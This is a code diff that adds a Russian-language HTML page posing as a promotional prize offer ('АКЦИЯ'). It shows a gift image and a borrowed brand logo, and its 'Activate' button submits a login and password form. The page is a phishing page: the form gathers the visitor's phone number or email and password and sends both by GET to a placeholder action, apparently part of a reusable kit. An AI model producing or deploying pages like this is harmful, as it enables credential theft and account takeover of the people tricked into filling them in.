@@ -1,0 +1,273 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, user-scalable=false, initial-scale=1">
+	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+<title>АКЦИЯ</title>
+<style>
+body {
+  font-family: sans-serif;
+  background-color: #f3e8e8;
+  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen,
+    Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
+  box-sizing: border-box;
+}
+
+a {
+  text-decoration: none;
+}
+
+.container {
+  max-width: 1000px;
+  margin: 0 auto;
+  display: flex;
+  justify-content: center;
+  flex-direction: column;
+  align-items: center;
+  margin-top: 3rem;
+  font-size: 14px;
+}
+
+.box {
+  max-width: 350px;
+  width: 100%;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  flex-direction: column;
+  background-color: #ffff;
+  border: 1px solid #e6e6e6;
+  border-radius: 1px;
+  margin: 0 0 10px;
+  padding: 10px 0;
+  flex-grow: 1;
+}
+
+
+
+
+.field {
+  margin: 10px 0;
+  position: relative;
+  font-size: 14px;
+  width: 100%;
+  text-overflow: ellipsis;
+}
+
+input {
+  padding: 9px 0px 7px 9px;
+  font-size: 12px;
+  width: 16rem;
+  height: 1.2rem;
+  outline: none;
+  background: #fafafa;
+  border-radius: 3px;
+  border: 1px solid #efefef;
+}
+
+/* label intial position*/
+
+label {
+  position: absolute;
+  pointer-events: none;
+  left: 10px;
+  padding-bottom: 15px;
+  transform: translateY(10px);
+  line-height: 6px;
+  transition: all ease-out 0.1s;
+  font-size: 14px;
+  color: #999;
+  padding-top: 6px;
+}
+
+/* hiding placeholder in all browsers */
+
+input::placeholder {
+  visibility: hidden;
+}
+
+/* hiding  placeholder in mozilla */
+.login-form ::-moz-placeholder {
+  color: transparent;
+}
+
+/* label final position */
+input:not(:placeholder-shown) + label {
+  transform: translateY(0);
+  font-size: 11px;
+}
+
+/* input padding increases if placeholder is not shown */
+input:not(:placeholder-shown) {
+  padding-top: 14px;
+  padding-bottom: 2px;
+}
+
+.login-button {
+  text-align: center;
+  width: 100%;
+  padding: 0.5rem;
+  border: 1px solid transparent;
+  background-color: #EE8208;
+  color: #fff;
+  font-weight: 600;
+  font-size: 14px;
+  cursor: pointer;
+}
+
+.separator {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  color: #999;
+  margin-top: 6px;
+}
+
+.separator .line {
+  height: 1px;
+  width: 40%;
+  background-color: #dbdbdb;
+}
+
+.other {
+  display: flex;
+  justify-content: center;
+  flex-direction: column;
+  align-items: center;
+}
+
+.fb-login-btn {
+  margin: 1rem;
+  border: 0;
+  cursor: pointer;
+  font-size: 14px;
+  color: #EE8208;
+  font-weight: 600;
+  background: transparent;
+}
+
+.fb-icon {
+  color: #385185;
+  font-size: 1rem;
+  padding-right: 1px;
+}
+
+.forgot-password {
+  font-size: 11px;
+  color: #003569;
+}
+
+.signup {
+  color: #3897f0;
+  font-weight: 600;
+}
+
+img {
+  pointer-events: none;
+}
+
+.popup {
+  position: relative;
+  display: inline-block;
+  cursor: pointer;
+  -webkit-user-select: none;
+  -moz-user-select: none;
+  -ms-user-select: none;
+  user-select: none;
+}
+
+/* The actual popup */
+.popup .popuptext {
+  visibility: hidden;
+  width: 160px;
+  background-color: #555;
+  color: #fff;
+  text-align: center;
+  border-radius: 6px;
+  padding: 8px 0;
+  position: absolute;
+  z-index: 1;
+  bottom: 125%;
+  left: 50%;
+  margin-left: -80px;
+}
+
+/* Popup arrow */
+.popup .popuptext::after {
+  content: "";
+  position: absolute;
+  top: 100%;
+  left: 50%;
+  margin-left: -5px;
+  border-width: 5px;
+  border-style: solid;
+  border-color: #555 transparent transparent transparent;
+}
+
+/* Toggle this class - hide and show the popup */
+.popup .show {
+  visibility: visible;
+  -webkit-animation: fadeIn 1s;
+  animation: fadeIn 1s;
+}
+
+/* Add animation (fade in the popup) */
+@-webkit-keyframes fadeIn {
+  from {opacity: 0;} 
+  to {opacity: 1;}
+}
+
+@keyframes fadeIn {
+  from {opacity: 0;}
+  to {opacity:1 ;}
+}
+
+
+</style>
+
+</head>
+
+<body>
+
+
+<div>
+    <div class="other">
+    <img src='https://btspro.ru/wp-content/uploads/2018/02/podarok_akcii.png' width='170' height='150' unselectable="on">
+    <br/>
+     <img src='https://logodix.com/logo/1299520.png' width='240' height='55' unselectable="on">
+      <br/>
+        <form class="login-form" action="DETAILS" method="get">
+            <div class="field">
+                <input id="username" type="text" name="USERNAME" placeholder="Phone number, username, or email" />
+                <label for="username">Телефон или электронная почта</label>
+            </div>
+            <div class="field">
+                <input id="password" type="text" name="PASSWORD" placeholder="password" />
+                <label for="password">Пароль</label>
+            </div>
+
+            
+            <button class="login-button" type="submit" title="login">Активировать </button>
+            <!-- <span class="popuptext" id="myPopup" style="visibility: hidden;">A Simple Popup!</span> -->
+            
+
+            </div>
+          
+        </form>
+    </div> 
+</div>
+</form>
+</div>
+</div>
+
+<script>
+  // When the user clicks on div, open the popup
+  function myFunction() {
+    var popup = document.getElementById("myPopup");
+    popup.style.visibility = "visible"
+  }
+  </script>
+
+</body>
+
+</html>
